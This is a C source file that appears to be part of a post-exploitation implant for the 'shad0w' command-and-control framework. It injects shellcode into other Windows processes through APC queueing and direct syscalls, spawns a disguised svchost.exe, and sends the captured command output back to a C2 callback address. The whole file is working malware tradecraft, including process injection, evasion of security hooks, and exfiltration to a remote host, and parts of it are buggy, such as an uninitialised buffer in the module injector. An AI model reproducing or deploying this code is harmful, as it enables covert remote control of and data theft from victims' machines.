#define WIN32_LEAN_AND_MEAN

// kind of important 

#include <ntdef.h>
#include <stdio.h>
#include <stdlib.h>
#include <lmcons.h>
#include <windows.h>
#include <winbase.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <versionhelpers.h>
#include <processthreadsapi.h>

// our local stuff

#include "loader.h"
#include "settings.h"
#include "syscalls.h"

#define MAX_OUTPUT 1000
#define IDLE_KILL_TIME 60
SYSTEMTIME start_time, current_time;

// find a process that is suitable to inject into
HANDLE FindProcess(const char* process)
{   
    DWORD PID               = 0;
    HANDLE hProcess         = NULL;
    DWORD dwProcCount       = 0;
    WTS_PROCESS_INFO* pWPIs = NULL;

    if(!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
    {
        // error meaning we wont be able to get the processes
        printf("WTSEnumerateProcesses fail\n");
        return -1;
    }

    for(DWORD i = 0; i < dwProcCount; i++)
    {
        // check to see if we can infact open the process
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pWPIs[i].ProcessId);

        if (hProcess)
        {
            // if we can use the process, check it isn't us. If it isn't, return the pid to the injector
            if ((GetCurrentProcessId() != pWPIs[i].ProcessId) && (pWPIs[i].ProcessId != 0))
            {
                // free up the memory
                WTSFreeMemory(pWPIs);
                pWPIs = NULL;

                // return the pid to the injector
                return hProcess;
            }
        }
        
    }
    // went through the loop and never got a pid :-(
    return -1;
}

BOOL InjectModule(CHAR* Bytes, DWORD Size)
{
    PVOID rBuffer;
    HANDLE hProcess;

    // get a handle on a process
    hProcess = FindProcess(NULL);

    printf("Injecting into pid: %d\n", GetProcessId(hProcess));

    // rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    // WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    DWORD threadId = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

    BOOL bResult = Thread32First(hSnapshot, &threadEntry);
	while (bResult)
	{
		bResult = Thread32Next(hSnapshot, &threadEntry);
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == GetProcessId(hProcess))
			{
				threadId = threadEntry.th32ThreadID;
				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
                DWORD dwResult = QueueUserAPC((PAPCFUNC)rBuffer, hThread, NULL);

                printf("injected into tid: %d\n", threadId);

                CloseHandle(hThread);
			}
		}
	}

	CloseHandle(hSnapshot);
	CloseHandle(hProcess);

    if (threadId == 0)
    {
        // this means that we couldn't find a thread to inject into
        return FALSE;
    }

    return TRUE;
}

void ReadFromPipe(HANDLE g_hChildStd_OUT_Rd) 
{ 
   char chBuf[MAX_OUTPUT + 1];
   DWORD dwRead, rOpCode; 
   BOOL bSuccess = FALSE;
   
   do {
        // set the current timestamp
        GetLocalTime(&start_time);

        // read the data from the pipe
        bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, MAX_OUTPUT, &dwRead, NULL);
        
        // send the data to shad0w
        BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, 
                         &rOpCode, (char*)chBuf, DATA_CMD_OUT, dwRead);
        
        // clean up the old buffer
        memset(chBuf, '\0', sizeof(chBuf));
   } while (TRUE);
   
   return;
}

void ProcessWatch(HANDLE pHandle)
// not currently in use as is way to cpu intensive
{
    while (TRUE)
    {
        // check if there has been any output read yet
        if (start_time.wSecond != 0)
        {
            // if no data has been read in the last 5 seconds
            GetLocalTime(&current_time);
            if ((current_time.wSecond - start_time.wSecond) >= IDLE_KILL_TIME)
            {
                // kill the process
                TerminateProcess(pHandle, 1);
                DEBUG("killed idle process");
                return;
            }
            
        }
    }
    
}

BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
{
    /*
    Run user supplied code and send all the output back to them
    */
    
    DWORD threadId;
    HANDLE tHandle;
    HANDLE hProcess;
    ULONG oProc, nProc;

    LPVOID rBuffer = NULL;

    HANDLE g_hChildStd_IN_Rd = NULL;
    HANDLE g_hChildStd_IN_Wr = NULL;
    HANDLE g_hChildStd_OUT_Rd = NULL;
    HANDLE g_hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr; 

    // Set the bInheritHandle flag so pipe handles are inherited. 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    saAttr.bInheritHandle = TRUE; 
    saAttr.lpSecurityDescriptor = NULL;

    // need these so we can use the correct syscalls
    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    // resolve so we can use this later to identify what syscall we need
    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    // create a pipe to get the stdout 
    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("StdoutRd CreatePipe")); 
    }

    // ensure the read handle to the pipe for stdout is not inherited.
    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdout SetHandleInformation"));
    }

    // create a pipe for the child process's stdin.
    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
    {
        DEBUG(TEXT("Stdin CreatePipe")); 
    }

    // ensure the write handle to the pipe for stdin is not inherited. 
    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
    {
        DEBUG(TEXT("Stdin SetHandleInformation"));
    }

    // define our startup info
    STARTUPINFO sInfo;
    BOOL bSuccess = FALSE;
    PROCESS_INFORMATION pInfo; 

    // zero out the structures
    ZeroMemory( &pInfo, sizeof(PROCESS_INFORMATION) );
    ZeroMemory( &sInfo, sizeof(STARTUPINFO) );

    // change the std values to our pipes
    sInfo.cb = sizeof(STARTUPINFO); 
    sInfo.hStdError = g_hChildStd_OUT_Wr;
    sInfo.hStdOutput = g_hChildStd_OUT_Wr;
    sInfo.hStdInput = g_hChildStd_IN_Rd;
    sInfo.dwFlags |= STARTF_USESTDHANDLES;

    // get the os info so we can use the correct syscall number
    RtlGetVersion(&osInfo);

    // start the thread to read from the stdout pipe
    CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);

    // spawn svchost.exe with a different ppid an jus start it running
    CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

    // alloc the memory we need inside the process
    rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    
    // make sure we are using the correct syscall numbers, probly a nicer way of doing this
    if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
    {
        NtQueueApcThread     = &NtQueueApcThread10;
        NtWriteVirtualMemory = &NtWriteVirtualMemory10;
    } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
    {
        NtQueueApcThread     = &NtQueueApcThread81;
        NtWriteVirtualMemory = &NtWriteVirtualMemory81;
    }

    // write our shellcode bytes to the process
    NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);

    // change the permisions on the memory so we can execute it
    VirtualProtectEx(pInfo.hProcess, rBuffer, Size, PAGE_EXECUTE_READWRITE, &oProc);

    // execute the code inside the process
    NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);

    // clean up a bit
    ZeroMemory(Bytes, Size);

    return;
}

BOOL ExecuteMemory(char* Bytes, size_t Size, BOOL Module)
{
    do
    {
        // select the correct way the code needs to be ran
        switch (Module)
        {
        case TRUE:
            // execute module
            InjectModule(Bytes, Size);
            break;
        
        case FALSE:
            // execute arbitary user code
            InjectUserCode(Bytes, Size);
        
        default:
            break;
        }

        DEBUG("code should have run");
        break;

    } while (TRUE);

    return TRUE;
}